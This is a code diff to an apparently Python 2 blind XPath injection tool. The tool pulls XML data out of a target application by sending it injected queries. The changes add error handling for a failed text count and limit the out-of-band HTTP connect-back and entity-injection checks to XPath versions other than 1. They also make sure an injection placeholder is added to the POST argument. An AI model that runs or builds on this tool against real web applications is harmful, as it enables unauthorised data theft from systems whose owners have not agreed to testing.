@@ -58,6 +58,7 @@ def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
 
     for i in xrange(STEP):
         r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count))
+        #print payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count)
         #raw_input("Count: r = %s"%r)
         if not r:
             MIN+=INC
@@ -221,10 +222,13 @@ def GetXMLFromNode(payloads, node):
 
     if not args.schema_only:
         text_count = yield Count(payloads, node=node+"/text()", count_type=CountTypes.LENGTH)
-        for i in xrange(1,text_count+1):
-            value = yield GetCharacters(payloads, node+"/text()[%s]"%i, count_it=True)
-            if value:
-                writer.data(value)
+        if text_count is None:
+            sys.stderr.write("Fetching node %s text failed, perhaps increase step-size or ensure target is injectible"%node)
+        else:
+            for i in xrange(1,text_count+1):
+                value = yield GetCharacters(payloads, node+"/text()[%s]"%i, count_it=True)
+                if value:
+                    writer.data(value)
 
     writer.end()
 
@@ -274,26 +278,26 @@ def Main(args):
         xversion = yield payloads.DetectXPathVersion()
         sys.stdout.write("%s\n"%xversion)
         args.xversion = xversion
-
-        sys.stdout.write("   * OOB HTTP Support: \n")
-        new_args = copy.deepcopy(args)
-        ip_addrs = [r[4][0] for r in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
-        for ip,port in zip(ip_addrs,itertools.cycle([80,53])):
-            new_args.connectback = "%s:%s"%(ip,port)
-            sys.stdout.write("     * %s: "%new_args.connectback)
-            listener = MakeListener(site, port, ip)
-            if TestTransfer(new_args):
-                sys.stdout.write("Success\n")
-                args.connectback = new_args.connectback
-                break
-            else:
-                sys.stdout.write("Failed\n")
-                listener.stopListening()
-        sys.stdout.flush()
-        sys.stdout.write("   * Entity Injection Retrieval: ")
-        inj = yield DetectEntityInjection(args)
-        if inj: print "Supported"
-        else:   print "Unsupported"
+        if args.xversion != "1":
+            sys.stdout.write("   * OOB HTTP Support: \n")
+            new_args = copy.deepcopy(args)
+            ip_addrs = [r[4][0] for r in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET)]
+            for ip,port in zip(ip_addrs,itertools.cycle([80,53])):
+                new_args.connectback = "%s:%s"%(ip,port)
+                sys.stdout.write("     * %s: "%new_args.connectback)
+                listener = MakeListener(site, port, ip)
+                if TestTransfer(new_args):
+                    sys.stdout.write("Success\n")
+                    args.connectback = new_args.connectback
+                    break
+                else:
+                    sys.stdout.write("Failed\n")
+                    listener.stopListening()
+            sys.stdout.flush()
+            sys.stdout.write("   * Entity Injection Retrieval: ")
+            inj = yield DetectEntityInjection(args)
+            if inj: print "Supported"
+            else:   print "Unsupported"
 
 
     if args.xversion == "auto":
@@ -440,6 +444,9 @@ if __name__ == "__main__":
     if not args.post_argument:
         sys.stderr.write("Error: no POST/GET arguments supplied!\n")
         exit()
+
+    if "{0}" not in args.post_argument:
+        args.post_argument = "%s{0}"%args.post_argument
 
     if args.http_method == "POST":
         if not args.post_argument:
